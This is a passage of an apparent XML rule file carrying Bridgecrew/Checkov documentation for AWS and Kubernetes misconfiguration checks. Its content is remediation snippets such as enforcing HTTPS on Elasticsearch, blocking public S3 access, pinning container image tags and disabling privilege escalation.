<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---builtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-builtime"></div>Fix - Builtime</div><a aria-label="Skip link to Fix - Builtime" class="heading-anchor-icon fa fa-anchor" href="#fix---builtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<p><strong>Resources:</strong> AWS::Elasticsearch::Domain<br/>
*Argument:** Properties.NodeToNodeEncryptionOptions.Enabled</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Resources:
  ElasticsearchDomain:
    Type: AWS::Elasticsearch::Domain
    Properties:
      ...
      NodeToNodeEncryptionOptions:
+       Enabled: True
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/elasticsearch_5' target='_blank'> https://docs.bridgecrew.io/docs/elasticsearch_5</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/elasticsearch_5' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_83</key>
    <name>Ensure AWS Elasticsearch domains have EnforceHTTPS enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-elasticsearch-domains-do-not-have-enforcehttps-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-elasticsearch-domains-do-not-have-enforce-https-enabled"></div>AWS Elasticsearch domains do not have EnforceHTTPS enabled</div><a aria-label="Skip link to AWS Elasticsearch domains do not have EnforceHTTPS enabled" class="heading-anchor-icon fa fa-anchor" href="#aws-elasticsearch-domains-do-not-have-enforcehttps-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Amazon Elasticsearch Service (Amazon ES) allows you to build applications without setting up and maintaining your own search celuster on Amazon EC2. Amazon ES allows you to configure your domains to require that all traffic be submitted over HTTPS. This ensures communications between your clients and your domain are encrypted. </p>
<p>We recommend you configure the minimum required TLS version to <strong>accept</strong>. This option is a useful additional security control to ensure your clients are not misconfigured. </p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<p>To change the policy using the AWS Console, follow these steps:</p>
<ol>
<li>Log in to the AWS Management Console at <a href="https://console.aws.amazon.com/" target="_self">https://console.aws.amazon.com/</a>. </li>
<li>Open the <a href="https://console.aws.amazon.com/es/home" target="_self">Amazon Elasticsearch console</a>.</li>
<li>Open a domain.</li>
<li>Select <strong>Actions</strong> &gt; <strong>Modify encryptions</strong></li>
<li>Select <em>Require HTTPS for all traffic to the domain</em>.</li>
<li>Click <strong>Submit</strong>.</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---builtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-builtime"></div>Fix - Builtime</div><a aria-label="Skip link to Fix - Builtime" class="heading-anchor-icon fa fa-anchor" href="#fix---builtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<p><strong>Resource:</strong> AWS::Elasticsearch::Domain<br/>
<strong>Argument:</strong> Properties.DomainEndpointOptions.EnforceHTTPS</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Resources:
  Resource0:
    Type: 'AWS::Elasticsearch::Domain'
    Properties:
        ...
      DomainEndpointOptions:
+       EnforceHTTPS: True
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/elasticsearch_6' target='_blank'> https://docs.bridgecrew.io/docs/elasticsearch_6</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/elasticsearch_6' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_53</key>
    <name>Ensure S3 bucket has block public ACLS enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="s3-bucket-has-block-public-acls-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-s-3-bucket-has-block-public-acls-disabled"></div>S3 bucket has block public ACLS disabled</div><a aria-label="Skip link to S3 bucket has block public ACLS disabled" class="heading-anchor-icon fa fa-anchor" href="#s3-bucket-has-block-public-acls-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Amazon S3 buckets and objects are configured to be private. They are protected by default, with the option to use Access Control Lists (ACLs) and bucket policies to grant access to other AWS accounts and to anonymous public requests. The <strong>Block public access to buckets and objects granted through new access control lists (ACLs)</strong> option does not allow the use of new public bucket or object ACLs, ensuring  future PUT requests that include them will fail.</p>
<p>This setting helps protect against future attempts to use ACLs to make buckets or objects public. When an application tries to upload an object with a public ACL this setting will be blocked for public access.</p>
<p>We recommend you set S3 Bucket BlockPublicAcls to <strong>True</strong>.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<p>Terraform<br/>
Resource: aws_s3_bucket_public_access_block<br/>
Argument: block_public_acls   </p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">aws_s3_bucket_public_access_block.artifacts.tf</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="aws_s3_bucket_public_access_block.artifacts.tf">resource "aws_s3_bucket_public_access_block" "artifacts" {
  count  = var.bucketname == "" ? 1 : 0
  bucket = aws_s3_bucket.artifacts[0].id
  
+ block_public_acls   = true
  block_public_policy = true
  restrict_public_buckets = true
  ignore_public_acls=true
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_s3_19' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_s3_19</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_s3_19' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_11</key>
    <name>Ensure CPU limits are set</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="cpu-limits-are-not-set"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cpu-limits-are-not-set"></div>CPU limits are not set</div><a aria-label="Skip link to CPU limits are not set" class="heading-anchor-icon fa fa-anchor" href="#cpu-limits-are-not-set"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Kubernetes allows administrators to set CPU quotas in namespaces, as hard limits for resource usage. Containers cannot use more CPU than the configured limit. Provided the system has CPU time free, a container is guaranteed to be allocated as much CPU as it requests.</p>
<p>CPU quotas are used to ensure adequate utilization of shared resources. A system without managed quotas could eventually collapse due to  inadequate resources for the tasks it bares.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Resource</strong>: Container</li>
<li><strong>Argument</strong>: resources:limits:cpu (Optional)<br/>
Defines the CPU limit for the container.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
kind: Pod
metadata:
  name: &lt;name&gt;
spec:
  containers:
  - name: &lt;container name&gt;
    image: &lt;image&gt;
    resources:
      limits:
+       cpu: &lt;cpu limit&gt;
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_k8s_10' target='_blank'> https://docs.bridgecrew.io/docs/bc_k8s_10</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_k8s_10' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_14</key>
    <name>Ensure image tag is set to Fixed - not Latest or Blank</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="image-tag-is-not-set-to-fixed"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-image-tag-is-not-set-to-fixed"></div>Image tag is not set to Fixed</div><a aria-label="Skip link to Image tag is not set to Fixed" class="heading-anchor-icon fa fa-anchor" href="#image-tag-is-not-set-to-fixed"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>You can add a <strong>:fixed</strong> tag to a container image, making it easier to determine what it contains, for example to specify the version. Container image tags and digests are used to refer to a specific version or instance of a container image.</p>
<p>We recommend you avoid using the <strong>:latest</strong> and <strong>:blank</strong> tags when deploying containers in production as it is harder to track which version of the image is running, and more difficult to roll back properly.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<p><strong>Resource</strong>: Container<br/>
<strong>Argument</strong>: image:tag (Optional)<br/>
Defines the image version by a specific number or by using <strong>latest</strong>. </p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
kind: Pod
metadata:
  name: &lt;name&gt;
spec:
  containers:
  - name: &lt;container name&gt;
+   image: &lt;image&gt;:&lt;image version&gt;
-   image: &lt;image&gt;
-   image: &lt;image&gt;:latest
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_k8s_13' target='_blank'> https://docs.bridgecrew.io/docs/bc_k8s_13</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_k8s_13' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_15</key>
    <name>Ensure image pull policy is set to Always</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="image-pull-policy-is-not-set-to-always"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-image-pull-policy-is-not-set-to-always"></div>Image pull policy is not set to Always</div><a aria-label="Skip link to Image pull policy is not set to Always" class="heading-anchor-icon fa fa-anchor" href="#image-pull-policy-is-not-set-to-always"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The Image Pull Policy of a container is set using the <strong>imagePullPolicy</strong>. The <strong>imagePullPolicy</strong> and the tag of the image are triggered when the kubelet attempts to pull the specified image. When the <strong>imagePullPolicy</strong> is set to <strong>Always</strong>, you ensure the latest version of the image is deployed every time the pod is started. Avoid using the <strong>:latest</strong> tag when deploying containers in production, it is harder to track which version of the image is running and more difficult to roll back correctly.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<p><strong>Resource</strong>: Container<br/>
<strong>Argument</strong>: imagePullPolicy (Optional)<br/>
Defines for the kubelet when he should attempt to pull the specified image.</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
kind: Pod
metadata:
  name: &lt;name&gt;
spec:
  containers:
  - name: &lt;container name&gt;
+   imagePullPolicy: Always
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_k8s_14' target='_blank'> https://docs.bridgecrew.io/docs/bc_k8s_14</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_k8s_14' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_54</key>
    <name>Ensure S3 Bucket BlockPublicPolicy is set to True</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="s3-bucket-blockpublicpolicy-is-not-set-to-true"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-s-3-bucket-block-public-policy-is-not-set-to-true"></div>S3 bucket BlockPublicPolicy is not set to True</div><a aria-label="Skip link to S3 bucket BlockPublicPolicy is not set to True" class="heading-anchor-icon fa fa-anchor" href="#s3-bucket-blockpublicpolicy-is-not-set-to-true"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Amazon S3 Block Public Access policy works at the account level and on individual buckets, including those created in the future. It provides the ability to block existing public access, whether specified by an ACL or a policy, and ensures public access is not granted to newly created items. </p>
<p>If an AWS account is used to host a data lake or another business application, blocking public access will serve as an account-level guard against accidental public exposure.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<p>Terraform<br/>
Resource: aws_s3_bucket_public_access_block<br/>
Argument: block_public_policy</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">aws_s3_bucket_public_access_block.artifacts.tf</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="aws_s3_bucket_public_access_block.artifacts.tf">resource "aws_s3_bucket_public_access_block" "artifacts" {
  count  = var.bucketname == "" ? 1 : 0
  bucket = aws_s3_bucket.artifacts[0].id
  
  block_public_acls   = true
+ block_public_policy = true
  restrict_public_buckets = true
  ignore_public_acls=true
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_s3_20' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_s3_20</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_s3_20' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_55</key>
    <name>Ensure S3 bucket IgnorePublicAcls is set to True</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="s3-bucket-ignorepublicacls-is-not-set-to-true"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-s-3-bucket-ignore-public-acls-is-not-set-to-true"></div>S3 bucket IgnorePublicAcls is not set to True</div><a aria-label="Skip link to S3 bucket IgnorePublicAcls is not set to True" class="heading-anchor-icon fa fa-anchor" href="#s3-bucket-ignorepublicacls-is-not-set-to-true"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The IgnorePublicAcls setting causes S3 to ignore all public ACLs on a bucket and any objects that it contains.  Enabling this setting does not affect the persistence of any existing ACLs and does not prevent new public ACLs from being set.</p>
<p>This setting will block public access granted by ACLs while still allowing PUT Object calls that include a public ACL.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_s3_bucket_public_access_block</li>
<li><strong>Argument:</strong> ignore_public_acls</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">aws_s3_bucket_public_access_block.artifacts.tf</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="aws_s3_bucket_public_access_block.artifacts.tf">resource "aws_s3_bucket_public_access_block" "artifacts" {
  ...
  restrict_public_buckets = true
+ ignore_public_acls=true
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource:</strong> AWS::S3::Bucket</li>
<li><strong>Argument:</strong> Properties.PublicAccessBlockConfiguration.IgnorePublicAcls</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Type: 'AWS::S3::Bucket'
    Properties:
    ...
    PublicAccessBlockConfiguration:
        ...
+       IgnorePublicAcls: true
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_s3_21' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_s3_21</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_s3_21' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_20</key>
    <name>Ensure containers do not run with AllowPrivilegeEscalation</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="containers-run-with-allowprivilegeescalation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-containers-run-with-allow-privilege-escalation"></div>Containers run with AllowPrivilegeEscalation</div><a aria-label="Skip link to Containers run with AllowPrivilegeEscalation" class="heading-anchor-icon fa fa-anchor" href="#containers-run-with-allowprivilegeescalation"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The <strong>AllowPrivilegeEscalation</strong> Pod Security Policy controls whether or not a user is allowed to set the security context of a container to <strong>True</strong>. Setting it to <strong>False</strong> ensures that no child process of a container can gain more privileges than its parent.</p>
<p>We recommend you to set <strong>AllowPrivilegeEscalation</strong> to <strong>False</strong>, to ensure <strong>RunAsUser</strong> commands cannot bypass their existing sets of permissions.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Resource</strong>: Container</li>
<li><strong>Argument</strong>: allowPrivilegeEscalation (Optional)<br/>
If false, the pod can not request to allow privilege escalation. Default to true.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
kind: Pod
metadata:
  name: &lt;Pod name&gt;
spec:
  containers:
  - name: &lt;container name&gt;
    image: &lt;image&gt;
    securityContext:
+      allowPrivilegeEscalation: false
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_k8s_19' target='_blank'> https://docs.bridgecrew.io/docs/bc_k8s_19</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_k8s_19' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_25</key>
    <name>Ensure admission of containers with added capability is minimized</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="admission-of-containers-with-added-capability-is-not-minimized"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-admission-of-containers-with-added-capability-is-not-minimized"></div>Admission of containers with added capability is not minimized</div><a aria-label="Skip link to Admission of containers with added capability is not minimized" class="heading-anchor-icon fa fa-anchor" href="#admission-of-containers-with-added-capability-is-not-minimized"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Containers run with a default set of capabilities as assigned by the Container Runtime. By default this can include potentially dangerous capabilities. With Docker as the container runtime the NET_RAW capability is enabled which may be misused by malicious containers. Ideally, all containers should drop this capability.</p> <br/> <a href='https://docs.bridgecrew.io/docs/bc_k8s_24' target='_blank'> https://docs.bridgecrew.io/docs/bc_k8s_24</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_k8s_24' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_32</key>
    <name>Ensure seccomp profile is set to Docker/Default or Runtime/Default</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="seccomp-profile-is-not-set-to-dockerdefault-or-runtimedefault"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-seccomp-profile-is-not-set-to-docker-default-or-runtime-default"></div>seccomp profile is not set to Docker/Default or Runtime/Default</div><a aria-label="Skip link to seccomp profile is not set to Docker/Default or Runtime/Default" class="heading-anchor-icon fa fa-anchor" href="#seccomp-profile-is-not-set-to-dockerdefault-or-runtimedefault"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Secure computing mode (seccomp) is a Linux kernel feature used to restrict actions available within the container. The seccomp() system call operates on the seccomp state of the calling process. The default seccomp profile provides a reliable setting for running containers with seccomp and disables non-essential system calls.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Resource</strong>: Pod / Deployment / DaemonSet / StatefulSet / ReplicaSet / ReplicationController / Job / CronJob</li>
<li><strong>Argument</strong>: metadata:annotations (Optional)<br/>
Annotations attach arbitrary non-identifying metadata to objects.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Pod</button><button type="button">CronJob</button><button type="button">Other</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="Pod">apiVersion: v1
kind: Pod
metadata:
  name: &lt;name&gt;
  annotations:
+   seccomp.security.alpha.kubernetes.io/pod: "docker/default" 
    or
+   seccomp.security.alpha.kubernetes.io/pod: "runtime/default"
